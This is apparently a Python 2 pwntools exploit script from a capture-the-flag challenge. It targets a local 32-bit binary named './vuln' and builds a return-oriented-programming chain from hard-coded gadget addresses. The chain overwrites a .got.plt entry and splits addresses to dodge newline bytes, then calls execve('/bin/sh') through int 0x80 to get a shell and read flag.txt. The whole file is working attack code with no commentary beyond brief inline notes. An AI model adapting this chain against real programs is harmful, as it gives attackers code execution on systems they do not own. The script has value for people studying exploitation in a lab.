#!/usr/bin/env python2
from pwn import *
from struct import pack

BASE = 0x08048000
pop_esi = BASE+0x00001708
pop_edi = BASE+0x00001adb
pop_ecx_ebx = BASE+0x00026e92
mov_ebx_eax_call_esi = BASE+0x0005b19c
add_edi_ebx_jmp_edi = BASE+0x00045f38
pop_ebx = BASE+0x000001c9
pop_eax = BASE+0x00060e36
int_0x80 = BASE+0x000277a0
mov_edi_ebx_pop_ebx_esi_edi = BASE+0x00057471
add_edi_esi = BASE+0x00086edc
jmp_edi = BASE+0x000237f1
something_got_plt = 0x080DA004
payload = "/bin/sh\x00AAAAAAAABBBBCCCCDDDD"
payload += pack("<I",pop_edi)
payload += pack("<I",something_got_plt)
payload += pack("<I",pop_ebx)
payload += pack("<I",pop_edi)
payload += pack("<I",mov_edi_ebx_pop_ebx_esi_edi)#write pop_edi gadget in .got.plt
payload += pack("<I",0)
payload += pack("<I",0)
payload += pack("<I",0)
payload += pack("<I",pop_esi)
payload += pack("<I",something_got_plt) #esi=&(pop_edi)
payload += pack("<I",pop_ecx_ebx)
payload += pack("<II",0,0)#ecx=0,ebx=0
p1 = (mov_ebx_eax_call_esi) / 2 # contains newline
p2 = (mov_ebx_eax_call_esi) - p1
payload += pack("<I",pop_edi)
payload += pack("<I",p1)
payload += pack("<I",pop_ebx)
payload += pack("<I",p2)
payload += pack("<I",add_edi_ebx_jmp_edi) # -> mov_ebx_eax_call_esi -> pop_edi
p1 = (pop_eax) / 2 # contains newline
p2 = (pop_eax) - p1
payload += pack("<I",pop_edi)
payload += pack("<I",p1)
payload += pack("<I",pop_esi)
payload += pack("<I",p2)
payload += pack("<I",add_edi_esi)
payload += pack("<I",jmp_edi)
payload += pack("<I",0xb) # execve
payload += pack("<I",int_0x80)

p = process("./vuln")
p.sendline(payload)
p.sendline("cat flag.txt")
p.interactive()